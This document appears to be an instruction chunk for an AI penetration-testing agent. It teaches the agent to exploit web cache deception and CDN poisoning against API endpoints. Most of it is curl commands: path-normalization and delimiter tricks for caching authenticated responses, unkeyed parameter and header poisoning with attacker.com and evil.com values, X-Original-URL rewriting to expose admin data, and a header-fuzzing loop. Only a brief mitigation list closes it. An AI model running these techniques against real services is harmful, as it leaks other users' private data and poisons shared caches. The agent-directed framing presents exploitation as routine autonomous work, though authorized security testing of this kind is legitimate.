# Web Cache Deception & CDN Poisoning — Agent Chunk 86a
> Source: PortSwigger "Gotta Cache 'Em All" research (2024), CDN path normalization studies, cache key injection research
> Purpose: Teaches the agent to exploit web cache deception against API endpoints and abuse CDN path normalization differences for data leakage
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
Use this chunk when testing API endpoints served behind CDNs or caching proxies. Web cache deception tricks caches into storing authenticated responses that can then be served to other users. Test path normalization behavior differences between CDN and origin. Always verify caching behavior (cache headers, response timing) before attempting exploitation.

---

## 1. Web Cache Deception — Core Technique

### Attack Principle
```
1. API returns personalized/authenticated data at /api/user/profile
2. CDN caches responses based on file extension (.css, .js, .png)
3. Attacker crafts URL: /api/user/profile/anything.css
4. Origin server ignores "anything.css" (path normalization) and returns profile
5. CDN sees .css extension, caches the authenticated response
6. Attacker requests /api/user/profile/anything.css without auth
7. CDN serves cached response containing victim's profile data
```

### Basic Exploitation
```bash
# Step 1: Verify the API endpoint returns sensitive data
curl -H "Authorization: Bearer <victim_token>" \
  https://api.target.com/api/user/profile
# Response: {"name":"Victim","email":"victim@email.com","ssn":"123-45-6789"}

# Step 2: Test if appending a static extension still returns data
curl -H "Authorization: Bearer <victim_token>" \
  https://api.target.com/api/user/profile/x.css
# If response is same as Step 1: origin normalizes path

# Step 3: Check if response was cached
curl https://api.target.com/api/user/profile/x.css
# No auth header - if response contains victim data, cache deception works

# Verify with cache headers:
curl -D- https://api.target.com/api/user/profile/x.css | \
  grep -iE "(x-cache|cf-cache-status|age|x-served-by)"
# X-Cache: HIT = cached response served
```

### PortSwigger "Gotta Cache 'Em All" (2024) Research Findings
```
Key discoveries:
1. Many modern frameworks normalize paths before routing,
   stripping trailing path segments
2. CDNs cache based on the original URL including the appended segment
3. The mismatch between framework routing and CDN caching creates the flaw

Affected frameworks (path normalization behavior):
- Django: /api/profile/x.css -> routes to /api/profile view
- Flask: /api/profile/x.css -> 404 (NOT vulnerable by default)
- Rails: /api/profile/x.css -> routes to /api/profile view
- Express: /api/profile/x.css -> depends on route definition
- Spring: /api/profile/x.css -> routes to /api/profile (if suffix match enabled)
- Laravel: /api/profile/x.css -> routes to /api/profile view

Extensions that CDNs commonly cache:
.css, .js, .png, .jpg, .gif, .ico, .svg, .woff, .woff2, .ttf, .eot
```

---

## 2. CDN Path Normalization Differences

### Normalization Behavior Table

| CDN/Proxy | Dot Segments (/../) | URL Encoding (%2f) | Case Normalization | Trailing Slash |
|-----------|--------------------|--------------------|-------------------|----------------|
| Cloudflare | Does NOT normalize | Does NOT decode | Preserves case | Preserves |
| Google Cloud CDN | Does NOT normalize | Does NOT decode | Preserves case | Preserves |
| Fastly | Does NOT normalize | Does NOT decode | Preserves case | Preserves |
| AWS CloudFront | Normalizes | Decodes | Preserves case | Normalizes |
| Azure CDN | Normalizes | Decodes | Lowercases | Normalizes |
| Imperva | Normalizes | Decodes | Preserves case | Normalizes |

### Exploitation Based on Normalization Gaps

**Scenario: Cloudflare CDN + Django backend**
```bash
# Cloudflare does NOT normalize paths
# Django DOES normalize paths (resolves dot segments)

# URL sent: /api/profile/../profile/x.css
# Cloudflare cache key: /api/profile/../profile/x.css (unique, uncached)
# Django resolves to: /api/profile (returns profile data)
# Cloudflare caches the response under the dot-segment path

curl -H "Authorization: Bearer <victim_token>" \
  "https://target.com/api/profile/../profile/x.css"
# Django returns profile, Cloudflare caches it

curl "https://target.com/api/profile/../profile/x.css"
# Attacker gets cached profile data without auth
```

**Scenario: Encoded slash differences**
```bash
# CDN does not decode %2f, origin does
# URL: /api/profile%2f..%2fprofile/x.css
# CDN cache key: /api/profile%2f..%2fprofile/x.css (new entry)
# Origin decodes to: /api/profile/../profile -> /api/profile

curl -H "Authorization: Bearer <victim_token>" \
  "https://target.com/api/profile%2f..%2fprofile/x.css"
```

---

## 3. Cache Key Injection via Delimiter Flaws

### Delimiter Characters That Split Cache Keys
```bash
# Some CDNs/caches use delimiters that differ from the origin server

# Semicolon delimiter (Tomcat treats as path parameter)
/api/profile;x.css
# CDN sees extension .css -> caches
# Tomcat sees /api/profile with path parameter "x.css" -> returns profile

# Hash/fragment (should not reach server but some proxies forward it)
/api/profile%23x.css
# URL-encoded #, some proxies pass it to origin

# Question mark injection
/api/profile?cachebust=x.css
# CDN may key on extension of last path-like component
# Origin ignores cachebust parameter

# Null byte
/api/profile%00.css
# CDN sees .css extension
# Some origins truncate at null byte -> /api/profile
```

### Cache Key Poisoning via Unkeyed Parameters
```bash
# Test: Which query parameters are in the cache key?
# Many CDNs exclude utm_* and tracking parameters from cache keys

# Request 1 (poisons cache):
curl -H "Authorization: Bearer <victim_token>" \
  "https://target.com/api/profile?utm_source=evil"

# Request 2 (same cache key, different user):
curl "https://target.com/api/profile?utm_source=evil"
# If utm_source is unkeyed, this returns victim's cached profile
```

---

## 4. Unkeyed Headers Exploitation

```bash
# Test which headers affect the response but are NOT in the cache key

# X-Forwarded-Host (unkeyed by many CDNs)
curl -D- "https://target.com/api/config" \
  -H "X-Forwarded-Host: attacker.com"
# If response references attacker.com (JS imports, redirects)
# and response is cached, all subsequent users load attacker's resources

# X-Forwarded-Proto
curl -D- "https://target.com/api/config" \
  -H "X-Forwarded-Proto: http"
# May cause API to generate HTTP links in cached response

# X-Original-URL / X-Rewrite-URL
curl -D- "https://target.com/static/public.css" \
  -H "X-Original-URL: /api/admin/users"
# Origin routes based on header (returns admin data)
# CDN caches under /static/public.css (public path)
# All users requesting public.css get admin data
```

### Testing Framework
```bash
# Automated unkeyed header detection
# Tool: param-miner (Burp Suite extension)

# Manual testing approach:
HEADERS=(
  "X-Forwarded-Host: evil.com"
  "X-Forwarded-Scheme: nothttps"
  "X-Forwarded-Proto: http"
  "X-Original-URL: /secret"
  "X-Rewrite-URL: /secret"
  "X-Forwarded-Port: 1337"
  "X-HTTP-Method-Override: POST"
  "X-Forwarded-Server: evil"
)

for h in "${HEADERS[@]}"; do
  echo "Testing: $h"
  # Send with header, check if response differs
  RESPONSE=$(curl -s -H "$h" "https://target.com/api/public/data")
  # Compare with baseline (no header)
  BASELINE=$(curl -s "https://target.com/api/public/data")
  if [ "$RESPONSE" != "$BASELINE" ]; then
    echo "  [!] Response differs with header: $h"
  fi
done
```

---

## 5. API Response Caching for Data Leakage

### GraphQL Cache Deception
```bash
# GraphQL responses cached by CDN based on query hash
# Attack: Craft query that returns different data per user but same hash

# Persisted query with user context
curl "https://target.com/graphql?extensions={\"persistedQuery\":{\"sha256Hash\":\"abc123\"}}" \
  -H "Authorization: Bearer <victim_token>"
# CDN caches response keyed on hash

curl "https://target.com/graphql?extensions={\"persistedQuery\":{\"sha256Hash\":\"abc123\"}}"
# Attacker gets victim's data from cache
```

### REST API with Caching Misconfig
```bash
# API returns Cache-Control: public on authenticated responses
curl -D- -H "Authorization: Bearer <token>" \
  https://api.target.com/api/user/settings | grep -i cache-control

# If: Cache-Control: public, max-age=300
# CDN will cache and serve this to ALL users for 5 minutes

# Correct response should be:
# Cache-Control: private, no-store
# or at minimum:
# Cache-Control: private, max-age=0
# Vary: Authorization, Cookie
```

---

## 6. Detection & Mitigation
- Set `Cache-Control: private, no-store` on all authenticated API responses
- Include `Vary: Authorization, Cookie` on any response that varies by user
- Configure CDN to never cache responses with `Authorization` headers
- Normalize paths at the CDN edge before cache key computation
- Use consistent path normalization between CDN and origin
- Disable path parameter (`;`) support if not needed
- Exclude all user-specific content from caching rules
- Audit CDN cache key configuration: ensure all relevant headers/params are keyed
- Use cache tags or surrogate keys for fine-grained invalidation
- Monitor for unusual cache HIT patterns on authenticated endpoints
